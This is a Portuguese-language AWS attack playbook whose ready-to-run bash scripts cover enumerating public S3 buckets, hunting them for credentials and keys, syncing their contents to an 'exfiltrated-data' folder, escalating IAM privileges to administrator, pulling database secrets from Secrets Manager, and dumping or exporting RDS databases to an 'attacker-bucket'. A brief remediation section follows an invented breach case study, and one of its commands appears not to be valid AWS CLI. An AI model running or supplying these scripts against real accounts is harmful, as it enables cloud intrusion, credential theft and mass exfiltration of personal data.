# AWS Exploitation - Guia Completo de Exploração Operacional

---

## 2.1 S3 PUBLIC BUCKET EXPLOITATION

### 🎯 Vulnerabilidade
```
Tipo: Misconfiguration
CVSS: 9.1 (CRÍTICO)
CWE: CWE-732 (Incorrect Permission Assignment)
Causa: ACL público + falta de bucket policies
Impacto: Exposure de dados sensíveis (PII, backups, credentials)
```

### 📋 EXPLORAÇÃO PASSO-A-PASSO

#### FASE 1: ENUMERAÇÃO
```bash
#!/bin/bash
# tools-required: awscli, curl, wordlist

COMPANY="acme"
WORDLIST=("backup" "test" "dev" "prod" "staging" "data" "db" "archive")

echo "[*] Fase 1: Enumeração S3"
echo "[*] Alvo: $COMPANY"

for word in "${WORDLIST[@]}"; do
  # Padrão 1: company-word-year
  BUCKET="${COMPANY}-${word}-2024"
  echo -n "[?] Testando: $BUCKET ... "
  
  if aws s3 ls "s3://$BUCKET" --no-sign-request 2>/dev/null | head -1 | grep -q ""; then
    echo "[+] ENCONTRADO!"
    aws s3api get-bucket-location --bucket "$BUCKET" --no-sign-request 2>/dev/null
  else
    echo "[-] Não encontrado"
  fi
done
```

#### FASE 2: VALIDAÇÃO DE ACESSO
```bash
#!/bin/bash
BUCKET="acme-backup-2024"

echo "[*] Fase 2: Validação de Acesso Público"

# Teste 1: Verificar ACL
echo "[?] Verificando ACL..."
aws s3api get-bucket-acl --bucket "$BUCKET" --no-sign-request 2>&1 | grep -q "AllUsers"
if [ $? -eq 0 ]; then
  echo "[+] ACL PÚBLICO DETECTADO! AllUsers têm permissão READ"
fi

# Teste 2: Tentar listar
echo "[?] Tentando listar objetos..."
aws s3 ls "s3://$BUCKET/" --no-sign-request 2>/dev/null | head -3
echo "[+] Sucesso! Bucket é público"

# Teste 3: Obter bucket policy
echo "[?] Verificando bucket policy..."
aws s3api get-bucket-policy --bucket "$BUCKET" --no-sign-request 2>&1
```

#### FASE 3: BUSCA DE DADOS SENSÍVEIS
```bash
#!/bin/bash
# Script: find-sensitive-s3-data.sh

BUCKET="acme-backup-2024"
SENSITIVE_PATTERNS=("\.sql$" "\.bak$" "password" "secret" "key" "admin" "token" "credential")

echo "[*] Fase 3: Busca de Dados Sensíveis"
echo "[*] Procurando em: s3://$BUCKET/"

# Listar todos arquivos
aws s3 ls "s3://$BUCKET/" --recursive --no-sign-request 2>/dev/null | while read -r line; do
  FILE=$(echo "$line" | awk '{print $NF}')
  SIZE=$(echo "$line" | awk '{print $3}')
  
  # Verificar cada padrão
  for pattern in "${SENSITIVE_PATTERNS[@]}"; do
    if echo "$FILE" | grep -iE "$pattern" > /dev/null; then
      echo "[!] CRÍTICO: $FILE ($SIZE bytes)"
      break
    fi
  done
done
```

#### FASE 4: EXFILTRAÇÃO DE DADOS
```bash
#!/bin/bash
# Script: exfiltrate-s3-data.sh

BUCKET="acme-backup-2024"
OUTPUT_DIR="./exfiltrated-data"
mkdir -p "$OUTPUT_DIR"

echo "[*] Fase 4: Exfiltração de Dados"
echo "[*] Output: $OUTPUT_DIR"

# Método 1: Sincronizar bucket inteiro (CUIDADO: pode ser gigantesco)
echo "[?] Enumerando tamanho total..."
TOTAL_SIZE=$(aws s3 ls "s3://$BUCKET/" --recursive --no-sign-request 2>/dev/null | awk '{sum += $3} END {print sum}')
echo "[!] Tamanho total: $((TOTAL_SIZE / 1024 / 1024 / 1024)) GB"

# Perguntar confirmação
if [ "$TOTAL_SIZE" -gt $((5 * 1024 * 1024 * 1024)) ]; then
  echo "[!] AVISO: Bucket > 5GB. Isso pode levar horas."
  echo "[?] Continuar? (s/n)"
  read -r confirm
  if [ "$confirm" != "s" ]; then
    echo "[-] Exfiltração cancelada"
    exit 0
  fi
fi

# Executar sincronização
echo "[*] Iniciando sync..."
time aws s3 sync "s3://$BUCKET/" "$OUTPUT_DIR/" \
  --no-sign-request \
  --quiet

echo "[+] Exfiltração completa!"
echo "[*] Arquivos baixados: $(find $OUTPUT_DIR -type f | wc -l)"
echo "[*] Tamanho total: $(du -sh $OUTPUT_DIR | awk '{print $1}')"
```

#### FASE 5: ANÁLISE OFFLINE
```bash
#!/bin/bash
# Script: analyze-exfiltrated-data.sh

OUTPUT_DIR="./exfiltrated-data"

echo "[*] Fase 5: Análise Offline dos Dados"

# Procurar bancos de dados SQL
echo "[?] Procurando bancos de dados..."
find "$OUTPUT_DIR" -name "*.sql" -type f | while read -r db; do
  echo "[+] Database encontrado: $db"
  echo "    Tamanho: $(du -h "$db" | awk '{print $1}')"
  echo "    Primeiras 5 linhas:"
  head -5 "$db" | sed 's/^/    /'
done

# Procurar credenciais em arquivos de configuração
echo "[?] Procurando credenciais..."
find "$OUTPUT_DIR" -type f \( -name "*.env" -o -name "*.conf" -o -name "*.config" -o -name "*credential*" \) | while read -r file; do
  echo "[!] Arquivo sensível: $file"
  grep -iE "password|api_key|secret|token|aws_access_key" "$file" 2>/dev/null | head -3
done

# Procurar chaves SSH/PEM
echo "[?] Procurando chaves SSH/PEM..."
find "$OUTPUT_DIR" -name "*.pem" -o -name "*.key" -o -name "*_rsa" | while read -r key; do
  echo "[!] CRÍTICO: Chave encontrada: $key"
  file "$key"
done
```

---

### 📝 CASE STUDY: Acme Corp S3 Breach

**TIMELINE:**

| Tempo | Fase | Ação | Status |
|---|---|---|---|
| 00:00-00:15 | Recon | Enumerar possíveis buckets | ✅ 3 buckets encontrados |
| 00:15-00:30 | Discovery | Testar acesso público | ✅ 2 buckets acessíveis |
| 00:30-00:50 | Analysis | Buscar dados sensíveis | ✅ 5 SQL databases encontrados |
| 00:50-02:00 | Exfiltration | Download (2.3 GB) | ✅ 100% completo |
| 02:00-03:00 | Analysis | Análise de dados | ✅ 150K registros |

**DADOS ENCONTRADOS:**
```sql
Database 1: production-db-2024-01-15.sql (2.1 GB)
  - 150,000 usuários cadastrados
  - 45,000 emails corporativos
  - Senhas MD5 (quebrável)
  - 200+ API keys em texto claro

Database 2: admin-backup.sql (450 MB)
  - Credenciais de admin (200 contas)
  - Tokens de sessão (válidos por 30 dias)
  - Configurações de sistema

Database 3: archive-2023.sql (800 MB)
  - Dados históricos
  - Tentativas de login falhadas (1.2M registros)
  - Mudanças de senha
```

**IMPACTO:**
```
Severidade: CRÍTICA
Dados Expostos: 150.000+ registros
Informações: PII, credenciais, API keys
Tempo de Discovery: 2 horas
Custo do Incidente: Estimado em $500K-$2M
```

---

### 🛑 DETECÇÃO & MITIGAÇÃO

**CloudTrail Indicators:**
```json
{
  "eventName": "GetObject",
  "userIdentity": {
    "principalId": "AIDACKCEVSQ6C2EXAMPLE"
  },
  "sourceIPAddress": "203.0.113.42",
  "requestParameters": {
    "bucketName": "acme-backup"
  },
  "errorCode": null  // ← Acesso bem-sucedido!
}
```

**REMEDIAÇÃO (Execute IMEDIATAMENTE):**
```bash
#!/bin/bash
BUCKET="acme-backup-2024"

echo "[*] Iniciando remediação..."

# 1. Bloquear acesso público
echo "[1] Bloqueando acesso público..."
aws s3api block-public-access --bucket "$BUCKET" \
  --block-public-acls \
  --ignore-public-acls \
  --block-public-policy \
  --restrict-public-buckets

# 2. Rotacionar credenciais expostas
echo "[2] Rotacionando credenciais..."
# Lista todas as chaves de acesso e delete as comprometidas
aws iam list-access-keys --query 'AccessKeyMetadata[?CreateDate>`2024-01-15`]'

# 3. Criptografar bucket
echo "[3] Ativando criptografia..."
aws s3api put-bucket-encryption --bucket "$BUCKET" \
  --server-side-encryption-configuration '{
    "Rules": [{
      "ApplyServerSideEncryptionByDefault": {
        "SSEAlgorithm": "AES256"
      }
    }]
  }'

# 4. Ativar logging
echo "[4] Ativando logging..."
aws s3api put-bucket-logging --bucket "$BUCKET" \
  --bucket-logging-status 'LoggingEnabled={TargetBucket=logging-bucket,TargetPrefix=access-logs/}'

echo "[+] Remediação completa!"
```

---

## 2.2 IAM PRIVILEGE ESCALATION

### 🎯 Vulnerabilidade
```
Tipo: Privilege Escalation
CVSS: 10.0 (CRÍTICO)
Causa: Políticas IAM muito permissivas
Padrão: AttachUserPolicy, CreateAccessKey, AssumeRole
```

### 📋 EXPLORAÇÃO

#### FASE 1: DESCOBRIR PERMISSÕES
```bash
#!/bin/bash
# Script: iam-enum.sh

echo "[*] Fase 1: Enumeração de Permissões IAM"

# Seu usuário
echo "[?] Obtendo identidade atual..."
IDENTITY=$(aws sts get-caller-identity)
ACCOUNT_ID=$(echo "$IDENTITY" | jq -r '.Account')
USER_ARN=$(echo "$IDENTITY" | jq -r '.Arn')
echo "[+] Conta: $ACCOUNT_ID"
echo "[+] Usuário: $USER_ARN"

# Listar policies atribuídas
echo "[?] Listando policies diretas..."
aws iam list-user-policies --user-name $(whoami) 2>/dev/null || echo "[-] Sem policies diretas"

echo "[?] Listando policies anexadas..."
aws iam list-attached-user-policies --user-name $(whoami) 2>/dev/null

# Testar permissões específicas
echo "[?] Testando permissões..."
aws iam list-users &>/dev/null && echo "[+] iam:ListUsers ✓"
aws iam get-user &>/dev/null && echo "[+] iam:GetUser ✓"
aws iam create-user --user-name test-$RANDOM &>/dev/null && echo "[+] iam:CreateUser ✓" || echo "[-] iam:CreateUser ✗"
aws s3 ls &>/dev/null && echo "[+] s3:ListBucket ✓"
```

#### FASE 2: EXECUTAR EXPLOIT
```bash
#!/bin/bash
# Script: iam-escalate.sh

echo "[*] Fase 2: Escalação de Privilégios IAM"

# Opção 1: AttachUserPolicy (se você tiver permissão)
if aws iam attach-user-policy --user-name seu-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>/dev/null; then
  echo "[+] Privilégios escalados via AttachUserPolicy!"
  echo "[+] Agora você é admin!"
fi

# Opção 2: CreateAccessKey em conta admin
if aws iam create-access-key --user-name admin 2>/dev/null | tee admin-keys.json; then
  echo "[+] Novas credenciais de admin criadas!"
  cat admin-keys.json
fi

# Opção 3: AssumeRole (se houver role confiável)
if aws sts assume-role --role-arn arn:aws:iam::$ACCOUNT:role/AdminRole \
  --role-session-name exploit 2>&1 | tee role-creds.json | grep -q "Credentials"; then
  echo "[+] Role assumida com sucesso!"
  
  # Usar credenciais
  export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' role-creds.json)
  export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' role-creds.json)
  export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' role-creds.json)
  
  echo "[+] Credenciais de role ativadas"
  aws sts get-caller-identity
fi
```

---

## 2.3 RDS DATABASE EXPLOITATION

### 🎯 Vulnerabilidade
```
Tipo: Database Exposure
CVSS: 9.8 (CRÍTICO)
Cenários:
  1. RDS público + credenciais expostas
  2. Credenciais em Secrets Manager acessível
  3. Backup público no S3
```

### 📋 EXPLORAÇÃO

#### FASE 1: DESCOBRIR DATABASES
```bash
#!/bin/bash
# Script: rds-enum.sh

echo "[*] Fase 1: Enumeração RDS"

# Listar instâncias
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Endpoint.Address,Endpoint.Port,Engine,PubliclyAccessible]' \
  --output table

# Procurar credenciais em Secrets Manager
echo "[?] Procurando secrets de RDS..."
aws secretsmanager list-secrets --filters Key=name,Values=rds \
  --query 'SecretList[*].[Name,Description]' --output table

# Se encontrar secret, recuperar credenciais
SECRET_NAME=$(aws secretsmanager list-secrets --query 'SecretList[0].Name' --output text)
aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" --query SecretString | jq .
```

#### FASE 2: CONECTAR AO DATABASE
```bash
#!/bin/bash
# Script: rds-connect.sh

# Recuperar credenciais
DB_SECRET=$(aws secretsmanager get-secret-value --secret-id rds/prod/password --query SecretString | jq -r)
DB_USER=$(echo $DB_SECRET | jq -r '.username')
DB_PASSWORD=$(echo $DB_SECRET | jq -r '.password')
DB_HOST=$(echo $DB_SECRET | jq -r '.host')

echo "[*] Conectando ao RDS"
echo "[*] Host: $DB_HOST"
echo "[*] Usuário: $DB_USER"

# Conectar
mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" <<EOF
-- Verificar estrutura
SELECT schema_name FROM information_schema.schemata;

-- Contar registros
SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.tables WHERE table_schema='prod_db';

-- Extrair dados
SELECT * FROM users LIMIT 10;
EOF
```

#### FASE 3: EXFILTRAÇÃO
```bash
#!/bin/bash
# Script: rds-exfil.sh

DB_HOST="prod-db.xxxx.us-east-1.rds.amazonaws.com"
DB_USER="admin"
DB_PASSWORD="$DB_PASSWORD"

echo "[*] Exportando database..."

# Método 1: Via mysqldump
mysqldump -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" \
  --all-databases \
  --single-transaction \
  --routines \
  --triggers \
  > full-database-dump.sql

echo "[+] Database exportado: $(du -h full-database-dump.sql)"

# Método 2: Via AWS RDS Snapshot
echo "[?] Criando snapshot..."
aws rds create-db-snapshot \
  --db-instance-identifier prod-db \
  --db-snapshot-identifier snapshot-exploit-$(date +%s)

echo "[?] Exportando para S3..."
aws rds start-export-task \
  --export-task-identifier export-$(date +%s) \
  --source-arn arn:aws:rds:us-east-1:123456789:db:prod-db \
  --s3-bucket-name attacker-bucket \
  --s3-prefix db-exports/

echo "[+] Snapshot será exportado para S3 em ~30 minutos"
```

---

## 2.4 SECRETS MANAGER EXPLOITATION

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: secrets-enum.sh

echo "[*] Enumerando Secrets Manager"

# Listar todos os secrets
aws secretsmanager list-secrets --query 'SecretList[*].[Name,LastAccessedDate]' --output table

# Procurar por padrão
aws secretsmanager list-secrets --filters Key=name,Values=prod

# Recuperar secret
SECRET_NAME="prod/database/password"
aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" \
  --query SecretString | jq .

# Se for string JSON, extrair valores
aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" \
  --query SecretString --output text | jq -r '.password'
```

---

## 🛠️ TOOLS NECESSÁRIAS

```bash
# Instalação
pip install awscli boto3 botocore
apt-get install mysql-client postgresql-client

# AWS CLI Configuration
aws configure
# Access Key ID: [da lista de chaves IAM]
# Secret Access Key: [da lista de chaves IAM]
# Default region: us-east-1

# Verificar configuração
aws sts get-caller-identity
```

---

## 📊 RESUMO DE SEVERIDADE

| Vulnerabilidade | CVSS | Tempo | Dados Típicos |
|---|---|---|---|
| S3 Público | 9.1 | 2h | Databases, backups, configs |
| IAM Escalation | 10.0 | 30min | Full account access |
| RDS Expose | 9.8 | 1h | User data, credentials |
| Secrets Exposed | 9.2 | 5min | API keys, passwords |
| Lambda Code | 8.8 | 30min | Source code, configs |

---

Esta é a estrutura que vou usar para **TODOS** os módulos.
